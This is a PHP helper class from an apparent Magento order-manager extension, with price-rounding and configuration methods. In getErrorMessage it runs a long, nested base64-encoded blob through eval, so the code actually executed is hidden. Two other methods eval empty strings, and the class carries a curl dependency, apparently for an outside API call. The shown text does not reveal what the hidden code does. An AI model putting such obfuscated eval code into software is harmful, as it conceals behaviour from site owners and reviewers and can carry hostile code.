<?php

namespace IWD\OrderManager\Helper;

use Magento\Framework\App\Helper\AbstractHelper;

/**
 * Class Data
 * @package IWD\OrderManager\Helper
 */
final class Data extends AbstractHelper
{
    /**
     * Is Allow
     */
    const IS_ALLOW = 'isAllow';

    /**
     * Store
     */
    const STORE = 'store';

    /**
     * Details
     */
    const DETAILS = 'details';

    /**
     * XPath: extension enable
     */
    const ENABLED = 'iwdordermanager/general/enable';

    /**
     * @var \Magento\Framework\App\ProductMetadataInterface
     */
    private $productMetadata;

    /**
     * @var \Magento\Store\Model\StoreManagerInterface
     */
    private $storeManager;

    /**
     * @var \Magento\Framework\HTTP\Adapter\CurlFactory
     */
    private $curlFactory;

    /**
     * @var null
     */
    private $response = null;

    /**
     * @var \Magento\Framework\Math\CalculatorFactory
     */
    private $calculatorFactory;

    /**
     * Calculator instances for delta rounding of prices
     * @var float[]
     */
    private $calculators = [];

    /**
     * @var \Magento\Framework\Message\Session
     */
    private $session;

    /**
     * Data constructor.
     * @param \Magento\Framework\App\Helper\Context $context
     * @param \Magento\Store\Model\StoreManagerInterface $storeManager
     * @param \Magento\Framework\Math\CalculatorFactory $calculatorFactory
     * @param \Magento\Framework\HTTP\Adapter\CurlFactory $curlFactory
     * @param \Magento\Framework\App\ProductMetadataInterface $productMetadata
     * @param \Magento\Framework\Message\Session $session
     */
    public function __construct(
        \Magento\Framework\App\Helper\Context $context,
        \Magento\Store\Model\StoreManagerInterface $storeManager,
        \Magento\Framework\Math\CalculatorFactory $calculatorFactory,
        \Magento\Framework\HTTP\Adapter\CurlFactory $curlFactory,
        \Magento\Framework\App\ProductMetadataInterface $productMetadata,
        \Magento\Framework\Message\Session $session
    ) {
        parent::__construct($context);
        $this->storeManager = $storeManager;
        $this->curlFactory = $curlFactory;
        $this->calculatorFactory = $calculatorFactory;
        $this->productMetadata = $productMetadata;
        $this->session = $session;
    }

    /**
     * @return string
     */
    public function getMagentoEdition()
    {
        return $this->productMetadata->getEdition();
    }

    /**
     * @return bool
     */
    public function isExtensionEnabled()
    {
        return $this->scopeConfig->getValue(self::ENABLED) ? true : false;
    }

    /**
     * @return string|null
     */
    public function getErrorMessage()
    {
        $message = '';
        eval (base64_decode('IGV2YWwgKGJhc2U2NF9kZWNvZGUoJ0lHVjJZV3dnS0dKaGMyVTJORjlrWldOdlpHVW9KMGxIVmpKWlYzZG5TMGRLYUdNeVZUSk9SamxyV2xkT2RscEhWVzlLTUd4SVZtcEtXbFl6Wkc1VE1HUkxZVWROZVZaVVNrOVNhbXh5VjJ4a1QyUnNjRWhXVnpsTFRVZDRTVlp0Y0V0WGJGbDZXa2MxVkUxSFVreFpWV1JPWlZaYVZWTnJPVk5oYlhoNVZqSjRhMVF5VW5OalJXaFhWbnBzVEZSVlpEUlNWbFpYV2tkMFZHSkZWak5WYlRBeFZrWmFWazVWVGxwV1JYQlFXa1ZhWVdSWFRraGpSazVzWWxoa05GWXhhSGRUTVZwellqTm9VbUpHU2xOV2FrNVRZMnhXY1ZOdE9XdE5WM1EyV1ZST2ExUkZNWEpPVkVKWFlsUldkbGxVUmxwbFJtUnhWMjFHVTFadVFsVlhhMlEwVWpGa1YxSnVWbEpoTTJoVFZGYzFUbVZzVm5KWGEyUnJZa1pLZVZaSE5VTlZiRmw1Vld0MFZsWkZTa2haYlhoUFZteFNjbE50Ums1aE1YQmFWbXBHYTJFeFVrZFNXR2hVWVd4YVdWbHJaRzlWUm5CRlUydHdiRlpVVmxwWk1HUkhWakpLY2s1VVJsaFhTRUpNVm1wS1IyUkdVblZWYkdSb1lUQndWRlpHWkhkak1rNXpXa2hPVldKWVVtaFZiR1EwVWxaV2MxVnVUbFJpUlZZMVZsZHdRMVp0U2toVmJrcFdWbnBHVDFwRVJrdGpWazUwVW14a2FFMHdTalpXYkZwVFZERlplRlpZYkZOaVJuQlFWbTV3VjFSR2NGZGFSRUpwWWtoQ1dsZFVUbXRXUlRGSVpVVldWbFp0VW5KVk1uaEdaREZLZEU1V1VsZFdWRlpFVmpKd1EyTXhTa2RTYkdoaFVsaFNWRnBYZEdGbGJHUlpZMFU1VlUxcldraFphazV6VmpGWmVWVnNTbGRXUlVwSVdrWmFWMVpXVGxWV2JYUlhUVWhCZDFadE1IaGtNa1Y0VTFoc2JGSkZjR0ZaYkdRMFVrWnNjbHBGT1d0V2F6VXhWakl4ZDJGR1dYZE5TSEJXWVRGd1NGcEhlSFprTWtwR1ZXeEtWMDFzU2t4V1ZsSkRVakpLYzFSc1dtRk5NbEpvVkZab1ExZFdjRlpoU0dSYVZteFdNMVV4VWs5Vk1VcHlWMnBLV0dGclNucFZhMXBIVjBad1JtTkdTazVTVm5BeFZsUkdWMVF4Um5OaU0yUnBVbFpLVTFsdGRFdGhSbXhYVm10a2EySkhlRmhaVlZVMVlrZEtTVkZzY0ZkV2JVMHhWWHBHVDFKdFRrbFViSEJzWVhwV1JWZHJZM2hUTWxKWFZXNVNiRkp0YUhOV2FrWkxVMFprVlZOVVJsUk5iRW93VmtjMVMxWlhTbk5qUjJoV1lXdGFXRnBHV210U01WSjFVMjF3VTFZemFFdFhXSEJDVFZaS1NGSnNXbE5pVkZaVlZteFZNVkV4WkhGUmJrNVRVbXRhV1ZkclZuZFZhekZHVjI1V1ZrMVdXbEJWVjNoMlpESktSbFZzU21saWEwcDVWa1pqZUUweVVYaGFSbFpVWWxSV2FGUlZhRk5TVmxwWVRsaE9XbFp0VWtkVWJGSlBWMjFHY21FemFHRldNMmd6Vm1wS1RtVlZOVmRVYkdoVFYwVkZlRll4WkhkVU1VMTRVMnRvVkZkSGVGZFpiR2h2VkVaU1YxVnJUbXROVlRWWFdWVm9kMVpYUlhkT1dHUldWbTFTY2xVeWVFWmtNVXAwVGxaU1YxWlVWa1JXTW5CRFl6RktSMUpzYUdGU1dFSlRWRlZXWVdSV1ZYaFdhemxTWWtjNU0xbHJWbE5WYkZsNVZXMUdWVll6VW1oVWJYaHJZekZTY2xOdGJHbFdXRUYzVmtSR2ExbFhSbGRUV0d4c1UwVmFXVmxyWkU1bFJuQllaVWhrVjFKdGR6SldNblJYVm14YU5tSklWbFpOVmxwUVZWZDRkbVF5U2taVmJFcFhUV3hLVEZaV1VrTlNNa3B6Vkd4YVZXRXdjR2hVVldRMFVsWldWMXBIZEZSaVJWWXpWVzB3TVZaR1dsaFZiRUphVmxkU1QxcFdXbUZYUm5CR1pFVTFhVkpYT1RWV01XUTBZVEZKZVZScmFGUmliRnBXV1d4YWQyTkdWbkZUYWxKT1VtMTRXRmxWV2t0aFYwWTJZa2hXVlZaV1dYZFZNbmhHWkRGS2RFNVdVbGRXVkZaRVZqSndRMk14U2tkU2JHaGhVbGhDVTFSVlZtRmtWbFY0Vm1zNVVtSkhPVE5aYTFaVFZXeFplVlZyZEZaV1JVcE1XVEZhYTFZeVJrWlBWMnhUVmpOb1JsWXlkR3ROUjBaV1RWaEdVMkpVYkdGV2JURk9aVVprZEdWSVRtdFNhM0F4Vm0weGMyRldXbk5qU0d4V1RXcFdNMXBIZUZOamJGSjFVV3hLVjAxc1NreFdWbEpEVWpKS2MxUnNXbFZoTUhCb1ZGVmtORkpXVmxkYVIzUlVZa1ZXTTFWdE1ERldSbHBXVGxWT1dHRnJTbnBWYTFwSFYwWndSMk5GTldoTlZ6aDVWbXBLTkZReFJuUlRiazVwVW0xb1YxbHNhRk5YYkZKWVpVVjBUbUpIZUhwWGExWnJZV3hKZDJOSWNGVk5WMDQwVmpKNFdtVlhWa2xqUm1ocFVqRktWRmRYTVhwT1YwcHlUVlZhYTFKWVFsTlVWVlpoWkZaVmVGWnJPVkppUnpreldXdFdVMVZzV1hsVmEzUldWa1ZLU0ZsdGVFOVdiRkp5VTIxR1RsSXphRVpXVmxwcllURk9jMUpZWkZSaWExcFpWbTB4YjFWR2JISldiazVUVW01Q1NsWkhNVzlXTURGRlZtNXdXRlo2UVhoV1JFcExVakZ2ZW1KR1dtbGhNSEI0Vmtaa01GbFhUa2RpU0VwaFVtMVNiMVJWYUVKTmJHeHhVVlJHVTFJd1dsZFZiVEF4VmtaYVZrNVZUbGhoYTBwNlZXdGFSMWRHY0VaalJrcE9VbFp3TVZaVVJsZFVNVVp6WWpOa2FWSldTbE5XYWtwVFV6RldWVkZyWkdsaVIxSldWVEowYTJKSFNrbFJiRlpXVm0xTmVGbFdXa3BsVjFaSlVteG9hVkl3TVRSWGJHUTBaREZaZDA5V2FHeFNNMmhWVld4V2QwMHhaRlZUV0doWFRXdFdNMWt3VW1GaFZURkZWbXRXV2xac1draFpiWGhQVm14U2NsTnRSazVTTTJoR1ZsWmFhMkV4VG5OU1dHUlRZbFJXVlZac1ZURlJNV1J4VVc1T1UxSnJXbGxYYTFaM1ZXc3hSbGR1VmxkTlZrcE1WV3BLVjJNeVRrZFZiRXBYWld4YWIxWnROWGRTTWtsNFlrWmtZVkpHU21oWmEyaERWMVpTVjJGSGRHaE5WVFZKV2tWb1YxWlZNWFJVYWs1V1pXdEtlbFZyV2tkWFJuQkdZMFpLVGxKV2NERldWRVpYVkRGR2MySXpaR2xTVmtwVFZtcEtVMU14VmxWUmEyUnBZa1UxVjFaSGRFdFpWVEZJWlVWV1ZsWnRVbkpWTW5oR1pERktkRTVXVW1oTmF6UXdWMWQwYTFSdFZuTlZibEpvVWpCYVQxbHJXbUZrVmxwV1YyczVVbUpWY0hwV1YzUnZZVlpKZWxGdGFGZGlia0pZVkcxNGEyTXhVbkpVYkZKcFZsaEJkMVpYTUhoa01rVjRVMWhzYTAweWVGbFphMVV4WTFaU2NWRnNUbFppVld3MVYydFdkMVZyTVVaWGJsWldUVlphVUZWWGVIWmtNa3BHVld4S1YwMXNTa3hXVmxKRFVqSktjMVJzV2xWaE1IQm9WRlZrTkZKV1ZsZGFSM1JVWWtWV00xVnRNREZXUmxwV1RsVlNXbFp0VWxCYVJWcGhaRWRHU0dGSGVHbGhlbFpSVmxaU1MyTXhSbk5pTTJScFVsWktVMVpxU2xOVE1WWlZVV3RrYVdKRk5WZFdSM1JMV1ZVeFNHVkZWbFpXYlZKeVZUSjRSbVF4U25ST1ZsSlhWbFJXUkZZeWNFZGpiVlpYVTI1V2FsSXdXbGRVVlZaaFRWWlplRlZyY0U5V01VcFpWVEkxVTFZeVNsbFJia3BXWWxoQ2VsbDZSbkpsVlRWV1pFZDBhVlpVVmpOV01XaDNXVlpLVjFac2FGQldlbFpWVm14Vk1WRXhaSEZSYms1VFVtdGFXVmRyVm5kVmF6RkdWMjVXVmsxV1dsQlZWM2gyWkRKS1JsVnNTbGROYkVwTVZsWlNRMUl5U25OVWJGcFZZVEJ3YUZSVlpEUlNWbFpYV2tSQ2FGWnNiRFJXTW5CaFYyMVdjbU5GYUZwaVdHZ3pWbXRhUjFaWFNrWmpSa3BPWWtWd1IxWXhaSGRUYXpGWVZXeGthbEp0YUZaWlYzUkxZakZhZFdOSVRrNVdhelZYVjJ0YWEySkdXWGRPVkVKVlRWZG9lbFY2U2xka1ZsSnlUMVpLVG1KWWFFUldNbkJEWXpGS1IxSnNhR0ZTV0VKVFZGVldZV1JXVlhoV2F6bFNZa2M1TTFsclZsTlZiRmw1Vld0MFZsWkZTa2haYlhoUFZteFNjbE50Ums1U00yaEdWbFphYTJFeFRuTlRXR1JxVWtaYVdWbHJaRk5UUm10NVkzcFdUazFFUmtkYVJWWjNWV3N4UmxkdVZsWk5WbHBRVlZkNGRtUXlTa1pWYkVwWFRXeEtURlpXVWtOU01rcHpWR3hhVldFd2NHaFVWV1EwVTJ4U1ZsWlVSbE5TTUZwWFZXMHdNVlpHV2xaT1ZVNVlZV3RLZWxWcldrZFhSbkJHWTBaS1RsSldjREZXVkVaWFltMVJlRlZ1U2xWaWEwcFRWbXBLVTFNeFZsVlJhMlJwWWtVMVYxWkhkRXRaVlRGSVpVVldWbFp0VW5KVk1uaEtaVmRXU1ZWc1VsZFdWRll4VjFaU1MxTXhaRWRYYmxacVVqTkNUMWxVUm5kTlZsbDVaVVU1VW1GNmJGaFZWM2hUVld4YU5sWnJlR0ZXYlZGM1dXMTRkMWRXYTNwYVJsSk9Vak5vUmxaV1dtdGhNVTV6VWxoa1UySlVWbFZXYkZVeFVURmtjVkZ1VGxOU2ExcFpWMnRXZDFWck1VWlhibFpXVFZaYVVGWlVTbE5TTWs1SFlrWldhV0pyU21oV2JYQkxWVEpOZUZSc1dsWlhSMUpvVkZkMFlWZHNXa2hPV0dSYVZtMVNTRlZ0TldGV1IwVjVZVVY0V21FeVVrOWFWM2hIWkZaa2RHSkhiR2hsYkZvMlZtMXdUMk15UlhoVGJsSlZZbXhhVlZsdGVIZGpWbXhaWTBWa2FrMVhkekpXUjNNMVlVWktkRTlVVmxkaVIwMTRWakZhVm1WWFVraE9WbHBVVWpOb1JGZFdVa3RVTWxKSFYyNVdhbEl6UWxSYVZ6RXpaVVprV1dORmRGZE5WM2g1V1dwT2ExWXlTblJsU0VaYVlrWktlbFJzV21GU01YQkhXa2Q0YVZaVVJURldWekIzVFZac1YxWlliRlppV0ZKVlZteGFTMDFzWkhGUmJscHJUVlp3TVZsclpIZGhWbHBJWkhwR1ZrMVdjRkJaVjNNd1pERldjMU50YkU1aVZrcE1WbFpTUTFJeVNuTlViRnBWWVRCd2FGUlZaRFJTVmxaWFdrZDBWR0pGVmpOVk1WSlhWVEZLY2xkcVNsaGhhMHA2Vld0YVIxZEdjRVpqUmtwT1VsWndNVlpVUmxkaWJWRjRVV3hTV2swd1NrMVdhMmhPVDFWd05XRXpRbEJrZWpBNVNubHJjRTkzUFQwbktTazcnKSk7'));
        return $message;
    }

    /**
     * @return string|null
     */
    public function getHelpText()
    {
        $message = '';
        eval (base64_decode(''));
        return $message;
    }

    /**
     * @return string[]
     */
    public function requestToApi()
    {
        eval (base64_decode(''));
        return $this->response;
    }

    public function getResponse()
    {
        return $this->response;
    }

    /**
     * Round price considering delta
     *
     * @param float $price
     * @param string $type
     * @param bool $negative Indicates if we perform addition (true) or subtraction (false) of rounded value
     * @return float
     */
    public function roundPrice($price, $type = 'regular', $negative = false)
    {
        if ($price) {
            if (!isset($this->calculators[$type])) {
                $this->calculators[$type] = $this->calculatorFactory->create(
                    ['scope' => $this->storeManager->getStore(true)]
                );
            }
            $price = $this->calculators[$type]->deltaRound($price, $negative);
        }
        return $price;
    }
}
